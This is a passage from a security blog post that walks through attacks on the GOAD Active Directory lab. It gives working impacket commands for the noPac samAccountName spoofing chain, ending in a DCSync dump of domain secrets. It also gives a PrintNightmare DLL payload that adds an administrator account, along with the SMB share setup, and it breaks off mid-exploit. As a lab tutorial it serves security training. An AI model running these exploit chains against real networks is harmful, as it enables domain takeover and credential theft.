<!DOCTYPE html><html lang="fr" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="GOAD - part 5 - exploit with user" /><meta property="og:locale" content="fr" /><meta name="description" content="In the previous post (Goad pwning part4) we played with relay ntlm. During this article we will continue to discover what can be done using a valid domain account" /><meta property="og:description" content="In the previous post (Goad pwning part4) we played with relay ntlm. During this article we will continue to discover what can be done using a valid domain account" /><link rel="canonical" href="https://mayfly277.github.io/posts/GOADv2-pwning-part5/" /><meta property="og:url" content="https://mayfly277.github.io/posts/GOADv2-pwning-part5/" /><meta property="og:site_name" content="Mayfly" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-20T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="GOAD - part 5 - exploit with user" /><meta name="twitter:site" content="@M4yFly" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"In the previous post (Goad pwning part4) we played with relay ntlm. During this article we will continue to discover what can be done using a valid domain account","url":"https://mayfly277.github.io/posts/GOADv2-pwning-part5/","@type":"BlogPosting","headline":"GOAD - part 5 - exploit with user","dateModified":"2022-10-22T10:56:54+02:00","datePublished":"2022-07-20T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mayfly277.github.io/posts/GOADv2-pwning-part5/"},"@context":"https://schema.org"}</script><title>GOAD - part 5 - exploit with user | Mayfly</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Mayfly"><meta name="application-name" content="Mayfly"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/mayfly.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Mayfly</a></div><div class="site-subtitle font-italic">Hack, Code, Sleep, Repeat</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/mayfly277" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/M4yFly" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['mayfly277','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="https://www.root-me.org/mayfly" aria-label="rootme" class="order-6" target="_blank" rel="noopener"> <i class="fas fa-skull"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-7" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>GOAD - part 5 - exploit with user</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>GOAD - part 5 - exploit with user</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> mayfly </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Jul 20, 2022, 12:00 AM +0200" >Jul 20<i class="unloaded">2022-07-20T00:00:00+02:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Oct 22, 2022, 10:56 AM +0200" >Oct 22<i class="unloaded">2022-10-22T10:56:54+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1515 words">8 min read</span></div></div><div class="post-content"><p>In the previous post (<a href="/posts/GOADv2-pwning-part4/">Goad pwning part4</a>) we played with relay ntlm. During this article we will continue to discover what can be done using a valid domain account</p><p><img data-proofer-ignore data-src="/assets/blog/GOAD/account_on_domain.png" alt="account_on_domain.png" /></p><p>Here we will only try samAccountName exploit and PrintNightmare as MS14-068 is now too old (Windows Server 2012 R2 max).</p><h2 id="samaccountname-nopac">SamAccountName (nopac)</h2><p>In the end of 2021 when everyone was worried about the log4j “log4shell” vulnerability another vulnerability raise up with less noise : CVE-2021-42287.</p><ul><li><p>I will not re-explain the vulnerability, as it is wonderfully describe here by Charlie Clark : <a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a></p><li>The attack was automated on windows by cube0x0 : <a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a><li><p>And on linux by shutdown : <a href="https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing">https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing</a> (still in impacket pull requests : <a href="https://github.com/SecureAuthCorp/impacket/pull/1202">https://github.com/SecureAuthCorp/impacket/pull/1202</a> and <a href="https://github.com/SecureAuthCorp/impacket/pull/1224">https://github.com/SecureAuthCorp/impacket/pull/1224</a>)</p><li>As a huge fan of linux and exegol we will try the linux way :)</ul><h3 id="check-if-we-can-add-computer">Check if we can add computer</h3><p>For this attack i will use <code class="language-plaintext highlighter-rouge">north/jon.snow:iknownothing</code> account as we previously get it with kerberoasting in the part3.</p><p>Let’s find a cme module to check the machine account quota</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cme ldap <span class="nt">-L</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/cme_module_listing.png" alt="cme_module_listing.png" /></p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cme ldap winterfell.north.sevenkingdoms.local <span class="nt">-u</span> jon.snow <span class="nt">-p</span> iknownothing <span class="nt">-d</span> north.sevenkingdoms.local <span class="nt">-M</span> MAQ
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/machineaccountquota.png" alt="machineaccountquota.png" /></p><h3 id="prepare-impacket">Prepare Impacket</h3><p>Before exploiting with impacket let’s prepare our impacket version with the pull request we want.</p><ul><li>Clone the impacket repo</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">cd</span> /opt/tools
git clone https://github.com/SecureAuthCorp/impacket myimpacket
</pre></table></code></div></div><ul><li>Create our branch</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">cd </span>myimpacket
git checkout <span class="nt">-b</span> mydev
</pre></table></code></div></div><ul><li>Create a venv to don’t interfer with the host environment and install the repository we just checkout</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>python3 <span class="nt">-m</span> virtualenv myimpacket
<span class="nb">source </span>myimpacket/bin/activate
python3 <span class="nt">-m</span> pip <span class="nb">install</span> <span class="nb">.</span>
</pre></table></code></div></div><ul><li>Get the waiting pull requests we want (You can find a huge list of nice PR to merge in exegol install script : https://github.com/ShutdownRepo/Exegol-images/blame/main/sources/install.sh#L286 )</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>git fetch origin pull/1224/head:1224
git fetch origin pull/1202/head:1202
</pre></table></code></div></div><ul><li>Merge the pull requests to our branch</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>git merge 1202
git merge 1224
</pre></table></code></div></div><ul><li>Reorder the path entry result to load our pyenv bin before the others in the $PATH (this is needed on zsh, in bash it take directly our pyenv bins)</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rehash
</pre></table></code></div></div><ul><li>Now let’s check we get all the binaries and options we want :</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>renameMachine.py
getST.py
</pre></table></code></div></div><ul><li>Excellent, we are now using the latest impacket version with Shutdown (@_nwodtuhs) pull requests needed for this attack :)</ul><h3 id="exploit">Exploit</h3><p>What we will do is add a computer, clear the SPN of that computer, rename computer with the same name as the DC, obtain a TGT for that computer, reset the computer name to his original name, obtain a service ticket with the TGT we get previously and finally dcsync :)</p><ul><li>Add a new computer</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>addcomputer.py <span class="nt">-computer-name</span> <span class="s1">'samaccountname$'</span> <span class="nt">-computer-pass</span> <span class="s1">'ComputerPassword'</span> <span class="nt">-dc-host</span> winterfell.north.sevenkingdoms.local <span class="nt">-domain-netbios</span> NORTH <span class="s1">'north.sevenkingdoms.local/jon.snow:iknownothing'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/samaccountname_addcomputer.png" alt="samaccountname_addcomputer.png" /></p><ul><li>Clear the SPNs of our new computer (with dirkjan <a href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a> tool addspn)</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>addspn.py <span class="nt">--clear</span> <span class="nt">-t</span> <span class="s1">'samaccountname$'</span> <span class="nt">-u</span> <span class="s1">'north.sevenkingdoms.local\jon.snow'</span> <span class="nt">-p</span> <span class="s1">'iknownothing'</span> <span class="s1">'winterfell.north.sevenkingdoms.local'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/samaccountname_addspn.png" alt="samaccountname_addspn.png" /></p><ul><li>Rename the computer (computer -&gt; DC)</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>renameMachine.py <span class="nt">-current-name</span> <span class="s1">'samaccountname$'</span> <span class="nt">-new-name</span> <span class="s1">'winterfell'</span> <span class="nt">-dc-ip</span> <span class="s1">'winterfell.north.sevenkingdoms.local'</span> north.sevenkingdoms.local/jon.snow:iknownothing
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/samaccountname_renamemachine.png" alt="samaccountname_renamemachine.png" /></p><ul><li>Obtain a TGT</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>getTGT.py <span class="nt">-dc-ip</span> <span class="s1">'winterfell.north.sevenkingdoms.local'</span> <span class="s1">'north.sevenkingdoms.local'</span>/<span class="s1">'winterfell'</span>:<span class="s1">'ComputerPassword'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/samaccountname_getTGT.png" alt="samaccountname_getTGT.png" /></p><ul><li>Reset the computer name back to the original name</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>renameMachine.py <span class="nt">-current-name</span> <span class="s1">'winterfell'</span> <span class="nt">-new-name</span> <span class="s1">'samaccount$'</span> north.sevenkingdoms.local/jon.snow:iknownothing
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/samaccountname_rollbackname.png" alt="samaccountname_rollbackname.png" /></p><ul><li>Obtain a service ticket with S4U2self by presenting the previous TGT</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/winterfell.ccache
getST.py <span class="nt">-self</span> <span class="nt">-impersonate</span> <span class="s1">'administrator'</span> <span class="nt">-altservice</span> <span class="s1">'CIFS/winterfell.north.sevenkingdoms.local'</span> <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> <span class="s1">'winterfell.north.sevenkingdoms.local'</span> <span class="s1">'north.sevenkingdoms.local'</span>/<span class="s1">'winterfell'</span> <span class="nt">-debug</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/samaccountname_getST.png" alt="samaccountname_getST.png" /></p><ul><li>DCSync by presenting the service ticket</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
secretsdump.py <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> <span class="s1">'winterfell.north.sevenkingdoms.local'</span> @<span class="s1">'winterfell.north.sevenkingdoms.local'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/samaccountname_secretsdump.png" alt="samaccountname_secretsdump.png" /></p><ul><li><p>And voilà, we got all the north domain ntds.dit informations :)</p><li><p>Now clean up by deleting the computer we created with the administrator account hash we just get</p></ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>addcomputer.py <span class="nt">-computer-name</span> <span class="s1">'samaccountname$'</span> <span class="nt">-delete</span> <span class="nt">-dc-host</span> winterfell.north.sevenkingdoms.local <span class="nt">-domain-netbios</span> NORTH <span class="nt">-hashes</span> <span class="s1">'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4'</span> <span class="s1">'north.sevenkingdoms.local/Administrator'</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corporation
[*] Successfully deleted samaccountname$.
</pre></table></code></div></div><h2 id="printnightmare">PrintNightmare</h2><p>To exploit printnightmare we will first check if the spooler is active on targets</p><h3 id="check-spooler-is-active">Check spooler is active</h3><ul><li>With cme</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cme smb 192.168.56.10-23 <span class="nt">-M</span> spooler
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/cme_check_spooler.png" alt="cme_check_spooler.png" /></p><ul><li>With impacket rpcdump</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rpcdump.py @192.168.56.10 | egrep <span class="s1">'MS-RPRN|MS-PAR'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/printnightmare_check_rpcdump.png" alt="printnightmare_check_rpcdump.png" /></p><h3 id="prepare-impacket-1">Prepare impacket</h3><ul><li>To exploit with cube0x0 script you no longer need the modified impacket version as the modifications as been merged in the main project:<ul><li><a href="https://github.com/SecureAuthCorp/impacket/pull/1114">https://github.com/SecureAuthCorp/impacket/pull/1114</a><li><a href="https://github.com/SecureAuthCorp/impacket/pull/1109">https://github.com/SecureAuthCorp/impacket/pull/1109</a></ul></ul><h3 id="prepare-the-dll">Prepare the dll</h3><ul><li>Let’s prepare the exploitation dll<li>We will create a user and add it as local administrator<li>Create the file nightmare.c:</ul><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;windows.h&gt; 
</span>
<span class="kt">int</span> <span class="nf">RunCMD</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"net users pnightmare Passw0rd123. /add"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"net localgroup administrators pnightmare /add"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
    <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span>
    <span class="n">LPVOID</span> <span class="n">lpReserved</span>
<span class="p">)</span>
<span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
        <span class="n">RunCMD</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><ul><li>Compile it:</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>x86_64-w64-mingw32-gcc <span class="nt">-shared</span> <span class="nt">-o</span> nightmare.dll nightmare.c
</pre></table></code></div></div><h3 id="exploit-on-old-and-vulnerable-windows-server-2016-meereen">Exploit on old and vulnerable windows server 2016 (meereen)</h3><ul><li>Clone the exploit</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare
</pre></table></code></div></div><ul><li>Prepare a smb share with the dll</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbserver.py <span class="nt">-smb2support</span> ATTACKERSHARE <span class="nb">.</span>
</pre></table></code></div></div><ul><li>Before the exploit no user pnightmare</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/pnightmare_before.png" alt="pnightmare_before.png" /></p><ul><li>Try on Braavos<ul><li>Braavos is an up-to-date windows server 2016, the exploit will not work (same error if you try on the north domain on castelblack server)</ul></ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/printnightmare_error.png" alt="printnightmare_error.png" /></p><ul><li>Exploit on Meereen</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
